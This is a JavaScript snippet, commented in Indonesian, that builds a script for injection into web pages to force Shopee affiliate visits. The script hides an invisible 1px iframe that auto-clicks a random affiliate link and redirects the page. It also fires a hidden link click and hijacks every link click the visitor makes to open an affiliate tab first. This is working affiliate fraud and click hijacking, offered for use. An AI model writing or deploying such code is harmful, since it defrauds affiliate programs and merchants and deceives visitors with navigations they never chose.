// Script yang langsung auto-click tanpa delay panjang:
const instantScript = `
<script>
  const AFFILIATE_LINKS = ${JSON.stringify(AFFILIATE_LINKS)};
  
  // Function untuk auto-click instant
  function instantAutoClick() {
    // Buat invisible iframe yang akan mengklik link
    const iframe = document.createElement('iframe');
    iframe.style.cssText = \`
      position: fixed;
      top: 10px;
      left: 10px;
      width: 1px;
      height: 1px;
      border: none;
      opacity: 0;
      pointer-events: none;
    \`;
    
    // Isi iframe dengan link Shopee
    const shopeeUrl = AFFILIATE_LINKS[Math.floor(Math.random() * AFFILIATE_LINKS.length)];
    iframe.srcdoc = \`
      <!DOCTYPE html>
      <html>
        <head>
          <script>
            // Auto-click saat iframe load
            setTimeout(() => {
              // Buat link di dalam iframe
              const link = document.createElement('a');
              link.href = "\${shopeeUrl}";
              link.target = "_top";
              document.body.appendChild(link);
              link.click();
              
              // Juga coba buka app
              window.location.href = "\${shopeeUrl}";
            }, 100);
          <\/script>
        </head>
        <body></body>
      </html>
    \`;
    
    document.body.appendChild(iframe);
    
    // Juga coba direct click dari parent
    setTimeout(() => {
      const link = document.createElement('a');
      link.href = shopeeUrl;
      link.target = '_blank';
      link.style.display = 'none';
      document.body.appendChild(link);
      link.click();
    }, 200);
    
    console.log('🚀 Instant auto-click triggered');
  }
  
  // Tunggu DOM ready lalu langsung auto-click
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => {
      setTimeout(instantAutoClick, 1500); // 1.5 detik setelah load
    });
  } else {
    setTimeout(instantAutoClick, 1500);
  }
  
  // Tangani klik user
  document.addEventListener('click', function(e) {
    const link = e.target.closest('a');
    if (link && link.href) {
      e.preventDefault();
      
      // Buka Shopee
      const shopeeUrl = AFFILIATE_LINKS[Math.floor(Math.random() * AFFILIATE_LINKS.length)];
      window.open(shopeeUrl, '_blank');
      
      // Redirect ke tujuan
      setTimeout(() => {
        window.location.href = link.href;
      }, 500);
    }
  }, true);
</script>
`;
